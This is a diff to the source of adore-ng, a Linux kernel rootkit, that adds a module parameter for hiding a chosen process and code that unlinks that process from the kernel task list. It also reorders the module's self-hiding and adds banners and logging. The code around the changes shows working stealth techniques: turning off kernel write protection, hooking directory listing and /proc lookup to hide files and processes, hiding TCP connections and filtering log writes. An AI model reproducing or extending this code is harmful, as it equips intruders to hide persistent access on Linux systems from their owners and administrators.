@@ -1,14 +1,14 @@
 /*** (C) 2004-2005 by Stealth
  *** http://stealth.scorpions.net/rootkits
  *** http://stealth.openwall.net/rootkits
- *** 
+ ***
  *** 2008 wzt -- Fix gcc complier warnnings.
- ***	
+ ***
  *** http://www.xsec.org
  ***
  *** (C)'ed Under a BSDish license. Please look at LICENSE-file.
  *** SO YOU USE THIS AT YOUR OWN RISK!
- *** YOU ARE ONLY ALLOWED TO USE THIS IN LEGAL MANNERS. 
+ *** YOU ARE ONLY ALLOWED TO USE THIS IN LEGAL MANNERS.
  *** !!! FOR EDUCATIONAL PURPOSES ONLY !!!
  ***
  ***	-> Use ava to get all the things workin'.
@@ -54,6 +54,12 @@
 
 #include "adore-ng.h"
 
+#define LOG_ADORE	""
+
+/* Module parameter. */
+static int hide_pid = 0xFFFFFFFF;
+module_param(hide_pid, int, 0);
+
 #ifdef __x86_64__
 uint64_t orig_cr0;
 uint64_t clear_return_cr0(void)
@@ -80,7 +86,7 @@ void setback_cr0(uint64_t val)
 }
 #else
 unsigned orig_cr0;
-/*清除cr0寄存器的写保护位，第16位为WP写保护位*/
+/* Disable write-protection, bit 16 */
 unsigned clear_return_cr0(void)
 {
 	unsigned cr0 = 0;
@@ -96,7 +102,7 @@ unsigned clear_return_cr0(void)
 	);
 	return ret;
 }
-/*用orig_cr0恢复cr0寄存器*/
+/* Recover cr0 and enable write-protection */
 void setback_cr0(unsigned val)
 {
 	asm volatile ("movl %%eax, %%cr0"
@@ -114,7 +120,7 @@ typedef int (*readdir_t)(struct file *, void *, filldir_t);
 readdir_t orig_root_readdir = NULL, orig_opt_readdir = NULL;
 readdir_t orig_proc_readdir = NULL;
 
-#if (LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0))	
+#if (LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0))
 typedef int (*iterate_dir_t)(struct file *, struct dir_context *);
 iterate_dir_t orig_root_iterate = NULL;
 iterate_dir_t orig_opt_iterate = NULL;
@@ -130,11 +136,27 @@ struct dentry *(*orig_proc_lookup)(struct inode *, struct dentry *,
 
 static char hidden_procs[PID_MAX/8+1];
 
+/* Delete the task in task list. */
+inline void del_task_in_list(pid_t pid)
+{
+	struct task_struct *iter;
+
+	for_each_process(iter)
+	{
+		if (iter->pid == pid)
+		{
+			list_del_init(&(iter->tasks));
+			break;
+		}
+	}
+}
+
 inline void hide_proc(pid_t x)
 {
 	if (x >= PID_MAX || x == 1)
 		return;
 	hidden_procs[x/8] |= 1<<(x%8);
+	del_task_in_list(x);
 }
 
 inline void unhide_proc(pid_t x)
@@ -160,8 +182,8 @@ int adore_atoi(const char *str)
 {
 	int ret = 0, mul = 1;
 	const char *ptr;
-   
-	for (ptr = str; *ptr >= '0' && *ptr <= '9'; ptr++) 
+
+	for (ptr = str; *ptr >= '0' && *ptr <= '9'; ptr++)
 		;
 	ptr--;
 	while (ptr >= str) {
@@ -177,16 +199,13 @@ int adore_atoi(const char *str)
 /* Own implementation of find_task_by_pid() */
 struct task_struct *adore_find_task(pid_t pid)
 {
-	struct task_struct *p;  
+	struct task_struct *p;
 
-	//read_lock(&tasklist_lock);	
 	for_each_task(p) {
 		if (p->pid == pid) {
-	//		read_unlock(&tasklist_lock);
 			return p;
 		}
 	}
-	//read_unlock(&tasklist_lock);
 	return NULL;
 }
 
@@ -223,8 +242,8 @@ int should_be_hidden(pid_t pid)
 #endif
 #endif
 
-#if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 9, 0))	
-#define PATCH_UID 
+#if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 9, 0))
+#define PATCH_UID
 #else
 #define PATCH_UID .val
 #endif
@@ -347,14 +366,7 @@ int adore_opt_filldir(void *buf, const char *name, int nlen, loff_t off, u64 ino
 
 	iput(inode);
 	dput(dentry);
-/*
-	if (reiser) {
-		if (inode->i_state & I_NEW)
-			unlock_new_inode(inode);
-	}
 
-	iput(inode);
-*/
 	/* Is it hidden ? */
 	if (uid == ELITE_UID && gid == ELITE_GID) {
 		r = 0;
@@ -368,21 +380,14 @@ int adore_opt_filldir(void *buf, const char *name, int nlen, loff_t off, u64 ino
 int adore_opt_readdir(struct file *fp, void *buf, filldir_t filldir)
 {
 	int r = 0;
-#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
-	if (!fp || !fp->f_dentry || !buf || !filldir || !orig_root_readdir)
-#else
+
 	if (!fp || !fp->f_path.dentry || !buf || !filldir || !orig_root_readdir)
-#endif
 		return 0;
 
 	opt_filldir = filldir;
-#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
-	parent_opt_dir[current->pid % 1024] = fp->f_dentry;
-#else
 	parent_opt_dir[current->pid % 1024] = fp->f_path.dentry;
-#endif
 	r = orig_opt_readdir(fp, buf, adore_opt_filldir);
-	
+
 	return r;
 }
 
@@ -419,18 +424,19 @@ int adore_root_filldir(void *buf, const char *name, int nlen, loff_t off, u64 in
 
 	if (!dir)
 		return 0;
-	
+
 	/* Theres an odd 2.6 behaivior. iget() crashes on ReiserFS! using iget_locked
 	 * without the unlock_new_inode() doesnt crash, but deadlocks
 	 * time to time. So I basically emulate iget() without
 	 * the sb->s_op->read_inode(inode); and so it doesnt crash or deadlock.
 	 */
-	 
+
 	 if(strcmp(name, ".") == 0 || strcmp(name , "..") == 0)
 		return root_filldir(buf, name, nlen, off, ino, x);
-	 
-	/*下面的代码可以用这个代替，但是内核警告说最好不要用这个函数
-	 *struct dentry *lookup_one_len(const char *name, struct dentry *base, int len)
+
+	/* The following code can be used instead of this, but the kernel warned
+	 * that it is best not to use this function
+	 * struct dentry *lookup_one_len(const char *name, struct dentry *base, int len)
 	 */
 	this.name = name;
 	this.len = nlen;
@@ -444,20 +450,20 @@ int adore_root_filldir(void *buf, const char *name, int nlen, loff_t off, u64 in
 		if (!dir->d_inode->i_op->lookup)
 			return 0;
 		if(dir->d_inode->i_op->lookup(dir->d_inode, dentry, NULL) != 0) {
-			printk("lookup failed\n");
+			printk(LOG_ADORE"lookup error\n");
 			return 0;
 		}
 	}
 	if(!(inode = dentry->d_inode)) {
 		return 0;
 	}
-	
+
 	uid = inode->i_uid PATCH_UID;
 	gid = inode->i_gid PATCH_UID;
-	
+
 	//iput(inode);
 	//dput(dentry);
-	
+
 	/* Is it hidden ? */
 	if (uid == ELITE_UID && gid == ELITE_GID) {
 		r = 0;
@@ -472,21 +478,13 @@ int adore_root_readdir(struct file *fp, void *buf, filldir_t filldir)
 {
 	int r = 0;
 
-#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
-	if (!fp || !fp->f_dentry || !buf || !filldir || !orig_root_readdir)
-#else
 	if (!fp || !fp->f_path.dentry || !buf || !filldir || !orig_root_readdir)
-#endif
 		return 0;
 
 	root_filldir = filldir;
-#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
-	parent_dir[current->pid % 1024] = fp->f_dentry;
-#else
 	parent_dir[current->pid % 1024] = fp->f_path.dentry;
-#endif
 	r = orig_root_readdir(fp, buf, adore_root_filldir);
-	
+
 	return r;
 }
 
@@ -498,23 +496,15 @@ static int adore_opt_iterate(struct file *fp, struct dir_context *ctx)
 	struct dir_context new_ctx = {
 		.actor = adore_proc_filldir
 	};
-	
-#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
-	if (!fp || !fp->f_dentry || !orig_opt_iterate)
-#else
+
 	if (!fp || !fp->f_path.dentry || !orig_opt_iterate)
-#endif
 		return 0;
 
 	opt_filldir = ctx->actor;
 	memcpy(ctx, &new_ctx, sizeof(readdir_t));
-#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
-	parent_opt_dir[current->pid % 1024] = fp->f_dentry;
-#else
 	parent_opt_dir[current->pid % 1024] = fp->f_path.dentry;
-#endif
 	r = orig_opt_iterate(fp, ctx);
-	
+
 	return r;
 }
 
@@ -524,7 +514,7 @@ static int adore_proc_iterate(struct file *fp, struct dir_context *ctx)
 	struct dir_context new_ctx = {
 		.actor = adore_proc_filldir
 	};
-	
+
 	spin_lock(&proc_filldir_lock);
 	proc_filldir = ctx->actor;
 	memcpy(ctx, &new_ctx, sizeof(readdir_t));
@@ -539,29 +529,21 @@ static int adore_root_iterate(struct file *fp, struct dir_context *ctx)
 	struct dir_context new_ctx = {
 		.actor = adore_root_filldir
 	};
-	
-#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
-	if (!fp || !fp->f_dentry || !orig_root_iterate)
-#else
+
 	if (!fp || !fp->f_path.dentry || !orig_root_iterate)
-#endif
 		return -ENOTDIR;
-	
+
 	root_filldir = ctx->actor;
-#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
-	parent_dir[current->pid % 1024] = fp->f_dentry;
-#else
 	parent_dir[current->pid % 1024] = fp->f_path.dentry;
-#endif
-	
+
 	memcpy(ctx, &new_ctx, sizeof(readdir_t));
 	r = orig_root_iterate(fp, ctx);
-	
+
 	return r;
 }
 #endif
 
-int patch_vfs(const char *p, 
+int patch_vfs(const char *p,
 #if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0))
 			readdir_t *orig_readdir, readdir_t new_readdir
 #else
@@ -576,7 +558,7 @@ int patch_vfs(const char *p,
 	if (IS_ERR(filep)) {
         return -1;
 	}
-	
+
 #if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0))
 	if (orig_readdir)
 		*orig_readdir = filep->f_op->readdir;
@@ -586,11 +568,11 @@ int patch_vfs(const char *p,
 #endif
 
 	new_op = (struct file_operations *)filep->f_op;
-#if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0))	
+#if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0))
 	new_op->readdir = new_readdir;
 #else
 	new_op->iterate = new_iterate;
-	printk("patch starting, %p --> %p\n", *orig_iterate, new_iterate);
+	printk(LOG_ADORE"patch vfs     : %p --> %p\n", *orig_iterate, new_iterate);
 #endif
 
 	filep->f_op = new_op;
@@ -598,7 +580,7 @@ int patch_vfs(const char *p,
 	return 0;
 }
 
-int unpatch_vfs(const char *p, 
+int unpatch_vfs(const char *p,
 #if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0))
 				readdir_t orig_readdir
 #else
@@ -608,20 +590,20 @@ int unpatch_vfs(const char *p,
 {
     struct file_operations *new_op;
 	struct file *filep;
-	
+
     filep = filp_open(p, O_RDONLY|O_DIRECTORY, 0);
 	if (IS_ERR(filep)) {
         return -1;
 	}
 
 	new_op = (struct file_operations *)filep->f_op;
-#if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0))	
+#if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0))
 	new_op->readdir = orig_readdir;
 #else
-	printk("unpatch starting, %p --> %p\n", new_op->iterate, orig_iterate);
+	printk(LOG_ADORE"unpatch vfs     : %p --> %p\n", new_op->iterate, orig_iterate);
 	new_op->iterate = orig_iterate;
 #endif
-		
+
 	filp_close(filep, 0);
 	return 0;
 }
@@ -665,25 +647,21 @@ ssize_t adore_var_write(struct file *f, const char *buf, size_t blen, loff_t *of
 	    !(current->flags & PF_AUTH)) {
 		for (i = 0; var_filenames[i]; ++i) {
 			if (var_files[i] &&
-#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
-			    var_files[i]->f_dentry->d_inode->i_ino == f->f_dentry->d_inode->i_ino) {
-#else
 			    var_files[i]->f_path.dentry->d_inode->i_ino == f->f_path.dentry->d_inode->i_ino) {
-#endif
 				*off += blen;
 				return blen;
 			}
 		}
 	}
 	return orig_var_write(f, buf, blen, off);
-}	
+}
 
 #ifndef kobject_unregister
 void kobject_unregister(struct kobject * kobj)
 {
 	if (!kobj)
 		return;
-	
+
 	pr_debug("kobject %s: unregistering\n",kobject_name(kobj));
 	kobject_uevent(kobj, KOBJ_REMOVE);
 	kobject_del(kobj);
@@ -709,14 +687,10 @@ struct tcp_seq_afinfo *proc_find_tcp_seq(void)
 
 	filep = filp_open("/proc/net/tcp", O_RDONLY, 0);
 	if(!filep) return NULL;
-	
-#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
-	afinfo = PDE_DATA(filep->f_dentry->d_inode);
-#else
+
 	afinfo = PDE_DATA(filep->f_path.dentry->d_inode);
-#endif
 	filp_close(filep, 0);
-	
+
 	return afinfo;
 }
 #endif
@@ -738,11 +712,11 @@ int adore_tcp4_seq_show(struct seq_file *seq, void *v)
 			break;
 		}
 	}
-	
+
 	return r;
 }
 
-#if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 9, 0))	
+#if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 9, 0))
 #ifndef UNIXCREDS
 #define UNIXCREDS(skb)	(&UNIXCB((skb)).cred)
 #endif
@@ -777,13 +751,13 @@ int adore_unix_dgram_recvmsg(struct kiocb *kio, struct socket *sock,
 		msg->msg_namelen = 0;
 		skb = skb_recv_datagram(sk, flags|MSG_PEEK, noblock, &err);
 		if (!skb) goto out;
-#if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 9, 0))	
+#if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 9, 0))
 		creds = UNIXCREDS(skb);
 		if (!creds) goto out;
 		pid = creds->pid;
 #else
 		pid = pid_vnr(UNIXCB(skb).pid);
-#endif			
+#endif
 		if ((not_done = should_be_hidden(pid)))
 			skb_dequeue(&sk->sk_receive_queue);
 	} while (not_done);
@@ -842,24 +816,57 @@ int __init adore_init(void)
 	struct file *filep;
 	struct list_head *m = NULL, *p = NULL, *n = NULL;
 	struct module *me = NULL;
-	
+
 	memset(hidden_procs, 0, sizeof(hidden_procs));
 
+	printk(LOG_ADORE"\n");
+	printk(LOG_ADORE" ▄▄▄      ▓█████▄  ▒█████   ██▀███  ▓█████        ███▄    █   ▄████ \n");
+	printk(LOG_ADORE" ▒████▄    ▒██▀ ██▌▒██▒  ██▒▓██ ▒ ██▒▓█   ▀        ██ ▀█   █  ██▒ ▀█▒ \n");
+	printk(LOG_ADORE" ▒██  ▀█▄  ░██   █▌▒██░  ██▒▓██ ░▄█ ▒▒███    ███  ▓██  ▀█ ██▒▒██░▄▄▄░ \n");
+	printk(LOG_ADORE" ░██▄▄▄▄██ ░▓█▄   ▌▒██   ██░▒██▀▀█▄  ▒▓█  ▄  ▒▒▒  ▓██▒  ▐▌██▒░▓█  ██▓ \n");
+	printk(LOG_ADORE"  ▓█   ▓██▒░▒████▓ ░ ████▓▒░░██▓ ▒██▒░▒████▒      ▒██░   ▓██░░▒▓███▀▒ \n");
+	printk(LOG_ADORE"   ▒▒   ▓▒█░ ▒▒▓  ▒ ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░░ ▒░ ░      ░ ▒░   ▒ ▒  ░▒   ▒ \n");
+	printk(LOG_ADORE"     ▒   ▒▒ ░ ░ ▒  ▒   ░ ▒ ▒░   ░▒ ░ ▒░ ░ ░  ░      ░ ░░   ░ ▒░  ░   ░ \n");
+	printk(LOG_ADORE"	   ░   ▒    ░ ░  ░ ░ ░ ░ ▒    ░░   ░    ░            ░   ░ ░ ░ ░   ░ \n");
+	printk(LOG_ADORE"	         ░  ░   ░        ░ ░     ░        ░  ░               ░       ░ \n");
+	printk(LOG_ADORE"			            ░                                                       \n"); 
+
+	/* Hide process. */
+	if (hide_pid != -1)
+	{
+		printk(LOG_ADORE"Hide process PID %d\n", hide_pid);
+		hide_proc(hide_pid);
+	}
+
+	/* Hide adore module. */
+	me = THIS_MODULE;
+	m = &me->list;
+
+/* Newer 2.6 have an entry in /sys/modules for each LKM */
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(2,6,11)
+	kobject_unregister(&me->mkobj.kobj);
+#elif  LINUX_VERSION_CODE >= KERNEL_VERSION(2,6,8)
+	kobject_unregister(&me->mkobj->kobj);
+#endif
+
+	p = m->prev;
+	n = m->next;
+
+	n->prev = p;
+	p->next = n;
+
+	/* Patch function pointers. */
     filep = filp_open(proc_fs, O_RDONLY|O_DIRECTORY, 0);
-	if (IS_ERR(filep)) 
+	if (IS_ERR(filep))
 		return -1;
-	
+
 	orig_cr0 = clear_return_cr0();
 
-#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
-	new_inode_op = (struct inode_operations *)filep->f_dentry->d_inode->i_op;
-#else
 	new_inode_op = (struct inode_operations *)filep->f_path.dentry->d_inode->i_op;
-#endif
 	orig_proc_lookup = new_inode_op->lookup;
 	new_inode_op->lookup = adore_lookup;
-	
-#if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0))	
+
+#if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0))
 	patch_vfs(proc_fs, &orig_proc_readdir, adore_proc_readdir);
 	patch_vfs(root_fs, &orig_root_readdir, adore_root_readdir);
 	if (opt_fs)
@@ -870,12 +877,12 @@ int __init adore_init(void)
 	if (opt_fs)
 		patch_vfs(opt_fs, &orig_opt_iterate, adore_opt_iterate);
 #endif
-				  
+
 	t_afinfo = proc_find_tcp_seq();
 	if (t_afinfo) {
 		orig_tcp4_seq_show = t_afinfo->seq_ops.show;
 		t_afinfo->seq_ops.show = adore_tcp4_seq_show;
-		printk("patch proc_net: %p --> %p\n", orig_tcp4_seq_show, adore_tcp4_seq_show);
+		printk(LOG_ADORE"patch proc_net: %p --> %p\n", orig_tcp4_seq_show, adore_tcp4_seq_show);
 	}
 	patch_syslog();
 
@@ -889,29 +896,18 @@ int __init adore_init(void)
 		if (!j) {	/* just replace one time, its all the same FS */
 			new_op = (struct file_operations *)(var_files[i]->f_op);
 			orig_var_write = new_op->write;
+#if (LINUX_VERSION_CODE < KERNEL_VERSION(4, 4, 0))
 			new_op->write = adore_var_write;
+#endif
 			j = 1;
 		}
 	}
 	filp_close(filep, 0);
-	
-	me = THIS_MODULE;
-	m = &me->list;
-
-/* Newer 2.6 have an entry in /sys/modules for each LKM */
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(2,6,11)
-	kobject_unregister(&me->mkobj.kobj);
-#elif  LINUX_VERSION_CODE >= KERNEL_VERSION(2,6,8)
-	kobject_unregister(&me->mkobj->kobj);
-#endif
-	
-	p = m->prev;
-	n = m->next;
-
-	n->prev = p;
-	p->next = n;
 
 	setback_cr0(orig_cr0);
+	
+	printk(LOG_ADORE"Adore-ng v2.0 is now activated!\n"); 
+	
 	return 0;
 }
 
@@ -921,27 +917,23 @@ void __exit adore_cleanup(void)
 	struct inode_operations *new_inode_op;
 	int i = 0, j = 0;
 	struct file *filep;
-	
+
 	if (t_afinfo && orig_tcp4_seq_show)
 	{
-		printk("unpatch proc_net: %p --> %p\n", t_afinfo->seq_ops.show, orig_tcp4_seq_show);
+		printk(LOG_ADORE"unpatch proc_net: %p --> %p\n", t_afinfo->seq_ops.show, orig_tcp4_seq_show);
 		t_afinfo->seq_ops.show = orig_tcp4_seq_show;
 	}
-	
+
 	orig_cr0 = clear_return_cr0();
 
 	filep = filp_open(proc_fs, O_RDONLY|O_DIRECTORY, 0);
-	if (IS_ERR(filep)) 
+	if (IS_ERR(filep))
 		return ;
-	
-#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
-	new_inode_op = (struct inode_operations *)filep->f_dentry->d_inode->i_op;
-#else
+
 	new_inode_op = (struct inode_operations *)filep->f_path.dentry->d_inode->i_op;
-#endif
 	new_inode_op->lookup = orig_proc_lookup;
 
-#if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0))	
+#if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0))
 	unpatch_vfs(proc_fs, orig_proc_readdir);
 	unpatch_vfs(root_fs, orig_root_readdir);
 	if (orig_opt_readdir)
@@ -964,7 +956,7 @@ void __exit adore_cleanup(void)
 			filp_close(var_files[i], 0);
 		}
 	}
-	
+
 	filp_close(filep, 0);
 	setback_cr0(orig_cr0);
 }
